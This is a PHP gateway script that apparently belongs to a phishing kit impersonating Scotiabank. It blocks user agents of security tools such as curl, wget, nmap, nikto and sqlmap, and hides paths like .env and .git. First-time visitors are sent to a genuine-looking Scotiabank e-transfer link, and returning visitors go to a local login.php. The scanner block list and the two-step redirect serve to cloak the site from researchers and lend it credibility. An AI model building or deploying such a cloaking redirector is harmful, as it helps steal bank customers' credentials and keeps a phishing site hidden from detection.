<?php
declare(strict_types=1);

session_start();

/* ---------------- READ PAGE KEY ---------------- */
$pageKey = $_GET['pageKey'] ?? 'default_page';
$pageKey = preg_replace('/[^A-Za-z0-9_]/', '', $pageKey);

/* ---------------- FORCE HTTPS ---------------- */
$isHttps =
    (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ||
    (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https');

if (!$isHttps) {
    header(
        'Location: https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'],
        true,
        301
    );
    exit;
}

/* ---------------- NO CACHE ---------------- */
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: Thu, 01 Jan 1970 00:00:00 GMT');

/* ---------------- ANTI-SCANNER ---------------- */
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$blockedAgents = [
    'curl','wget','python','java','go-http',
    'httpclient','nmap','nikto','sqlmap',
    'dirbuster','scanner','fuzzer','spider','bot'
];
foreach ($blockedAgents as $b) {
    if (strpos($ua, $b) !== false) {
        http_response_code(403);
        exit;
    }
}

/* ---------------- BLOCK SENSITIVE PATHS ---------------- */
$uri = strtolower($_SERVER['REQUEST_URI'] ?? '');
$blockedPaths = [
    '.env','.git','wp-admin','wp-login',
    'phpinfo','backup','dump','sql','config'
];
foreach ($blockedPaths as $p) {
    if (strpos($uri, $p) !== false) {
        http_response_code(404);
        exit;
    }
}

/* ---------------- VISIT CONTROL ---------------- */
$cookieName    = "first_pass_" . $pageKey;
$firstVisitUrl = "https://secure.scotiabank.com/external-transfer/en/deposit-etransfer/CAJZWDj";
$returnUrl     = "login.php";

if (!isset($_COOKIE[$cookieName])) {
    setcookie($cookieName, '1', time() + 1800, '/', '', true, true);
    header("Location: $firstVisitUrl", true, 302);
    exit;
}

/* ---------------- SECURITY HEADERS ---------------- */
header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header('Referrer-Policy: no-referrer');
header('Permissions-Policy: geolocation=(), microphone=(), camera=()');
header(
    "Content-Security-Policy: " .
    "default-src 'self' https: data:; " .
    "script-src 'self' 'unsafe-inline' https:; " .
    "style-src 'self' 'unsafe-inline' https:; " .
    "img-src 'self' data: https:; " .
    "font-src 'self' data:;"
);

/* ---------------- FINAL REDIRECT ---------------- */
header("Location: $returnUrl", true, 302);
exit;
